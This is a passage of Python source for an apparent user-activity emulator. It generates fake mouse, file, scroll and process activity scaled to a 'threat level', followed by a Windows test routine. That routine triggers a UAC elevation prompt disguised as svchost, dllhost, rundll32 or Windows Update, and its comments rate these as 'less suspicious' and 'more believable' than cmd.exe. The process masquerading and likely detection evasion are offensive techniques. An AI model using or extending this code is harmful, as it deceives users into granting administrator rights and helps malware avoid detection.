        elif threat_level < 60:
            chance = 0.5
            # NO KEYBOARD - too risky in background
            activity_types = ["mouse_movement", "file_operations", "scroll"]
        elif threat_level < 80:
            chance = 0.8
            # NO KEYBOARD - too risky in background
            activity_types = ["mouse_movement", "file_operations", "scroll", "process_launch"]
        else:
            chance = 1.0
            # NO KEYBOARD - use mouse, files, processes, drag-drop only
            activity_types = ["mouse_movement", "file_operations", "scroll", "process_launch", "drag_drop"]

        if intention == "browse":
            activity_types = ["mouse_movement", "file_operations", "scroll"]
            chance = max(chance, 0.4)
        elif intention == "compose":
            # Compose leans toward file operations instead of keyboard
            activity_types = ["file_operations", "mouse_movement"]
            chance = max(chance, 0.6)
        elif intention == "work":
            activity_types = ["mouse_movement", "file_operations", "process_launch", "scroll"]
            chance = max(chance, 0.7)
        elif intention == "research":
            activity_types = ["file_operations", "scroll", "mouse_movement"]
            chance = max(chance, 0.6)
        elif intention == "aggressive":
            # Aggressive: mouse, files, processes, drag-drop (NO KEYBOARD)
            activity_types = ["mouse_movement", "file_operations", "process_launch", "scroll", "drag_drop"]
            chance = 1.0

        if random.random() > chance:
            return

        activity = random.choice(activity_types)
        
        try:
            if activity == "mouse_movement":
                self.mouse_movement(iterations=random.randint(2, 5))
            elif activity == "file_operations":
                self.file_operation_patterns(count=random.randint(2, 4), intent=intention)
            elif activity == "process_launch":
                self.process_launch_sequence(intention=intention)
            elif activity == "scroll":
                self.scroll_simulation(direction=random.choice(["up", "down"]))
            elif activity == "drag_drop":
                start = (random.randint(100, 500), random.randint(100, 500))
                end = (random.randint(600, 1000), random.randint(600, 900))
                self.drag_drop_simulation(start, end)
        except Exception as e:
            logger.warning(f"[UserActivity] emit_user_activity error: {e}")
    
    def emit_keyboard_activity(self, wpm: int = 60, text: Optional[str] = None) -> None:
        """
        Emit keyboard activity ONLY when safe (user has control of focus).
        
        CAUTION: This types into the active window. Only call when:
            - A text editor / safe input field has focus
            - You can control what window is active
        
        Args:
            wpm: Words per minute (default 60)
            text: Text to type (or None for random)
        """
        self.keyboard_simulation(wpm=wpm, text=text)
    
    def wait_for_activities(self, timeout: int = 30) -> bool:
        """
        Wait for all background activity threads to complete.
        
        Args:
            timeout: Maximum seconds to wait (default: 30)
            
        Returns:
            True if all threads completed, False if timeout
        """
        deadline = time.time() + timeout
        for thread in self.activity_threads:
            remaining = deadline - time.time()
            if remaining <= 0:
                return False
            thread.join(timeout=remaining)
        return True
    
    def stop_all_activities(self) -> None:
        """Stop all running activity threads (graceful daemon shutdown)."""
        # All threads are daemons, so they stop on process exit
        # This is just for explicit cleanup
        self.activity_threads.clear()


if __name__ == "__main__":
    import json
    
    logging.basicConfig(level=logging.INFO)
    
    print("[*] Initializing UserActivityEmulator...")
    emulator = UserActivityEmulator()
    
    print(f"[*] Platform: {platform.system()}")
    print(f"[*] Testing all activity types...\n")
    
    # Test each activity type
    print("[*] 1. Testing mouse movement...")
    emulator.mouse_movement(iterations=2, time_range=(100, 300))
    
    # SKIP: Keyboard test disabled to prevent typing into console
    # print("[*] 2. Testing keyboard simulation...")
    # emulator.keyboard_simulation(wpm=60, text="Testing keyboard input")
    
    print("[*] 2. Testing file operations...")
    emulator.file_operation_patterns(count=3)
    
    print("[*] 3. Testing process launch...")
    emulator.process_launch_sequence()
    
    print("[*] 4. Testing scroll simulation...")
    emulator.scroll_simulation(direction="down", delta=2)
    
    print("[*] 5. Testing drag-drop...")
    emulator.drag_drop_simulation((200, 200), (400, 400))
    
    print("\n[*] Emitting background activities (keyboard disabled during test)...")
    print("[*] NOTE: Keyboard disabled to prevent typing into console")
    
    for threat_level in [10, 50, 75, 100]:
        print(f"[*] Threat level: {threat_level}/100")
        for _ in range(3):
            # emit_user_activity but minimize keyboard
            emulator.emit_user_activity(threat_level=threat_level, intention="browse")
    
    print("\n[*] Waiting for all activities to complete (max 30s)...")
    emulator.wait_for_activities(timeout=30)
    
    print("[+] UserActivityEmulator test completed!")
    
    # ===========================================================
    # UAC ESCALATION TEST (Windows only)
    # ===========================================================
    if IS_WINDOWS:
        print("\n" + "="*60)
        print("[*] UAC ESCALATION & SPOOFING TEST")
        print("="*60)
        print("\n[!] IMPORTANT: UAC Dialog Security")
        print("    UAC runs on 'Secure Desktop' which blocks keyboard input")
        print("    You MUST click 'Yes' manually - auto-confirm cannot work")
        print("    This is by design (Windows security feature)\n")
        
        print("[*] Available spoofing options (look less suspicious):")
        print("    1. cmd.exe        (direct command execution - OBVIOUS)")
        print("    2. svchost.exe    (system service - common & natural)")
        print("    3. dllhost.exe    (COM object host - system-y)")
        print("    4. rundll32.exe   (DLL runner - used by Windows Update)")
        print("    5. wuauclt.exe    (Windows Update - legitimate escalation)\n")
        
        choice = input("[*] Choose spoof process (1-5, enter for svchost): ").strip() or "2"
        
        spoof_map = {
            "1": ("cmd.exe", "C:\\Windows\\System32\\cmd.exe"),
            "2": ("svchost", None),  # Will use uac_escalate_as_process
            "3": ("dllhost", None),
            "4": ("rundll32", None),
            "5": ("wuauclt", None),
        }
        
        choice_key = choice if choice in spoof_map else "2"
        process_name, exe_path = spoof_map[choice_key]
        
        print(f"\n[*] Triggering escalation as '{process_name}'...")
        print("[*] UAC dialog will appear - you must click 'Yes'")
        print("[*] Waiting 3 seconds... then attempting to activate Yes button\n")
        
        # Use spoofing if available
        if exe_path:
            result = emulator.uac_escalation(
                exe_path=exe_path,
                args="/c echo Escalated as cmd && timeout /t 2",
                wait_seconds=3.0,
                spoof_process=process_name
            )
        else:
            result = emulator.uac_escalate_as_process(
                process_name=process_name,
                args="/c echo Escalated && timeout /t 2"
            )
        
        # Give it time to execute
        import time as time_module
        time_module.sleep(5)
        
        if result:
            print("[+] UAC escalation initiated")
            print("[*] Check if:")
            print("    - UAC dialog appeared")
            print("    - A new cmd.exe window opened (after you click Yes)")
            print("    - Check taskbar or Task Manager\n")
        else:
            print("[-] UAC escalation failed")
        
        print("\n[NOTES]")
        print("- If dialog shows 'User Account Control' from svchost/dllhost:")
        print("  This is more believable than 'cmd.exe' asking for elevation")
        print("- Secure Desktop prevents keyboard input to UAC dialog")
        print("- Real UAC bypass requires exploits or different architecture")
    else:
        print("\n[*] UAC escalation test skipped (Windows only)")
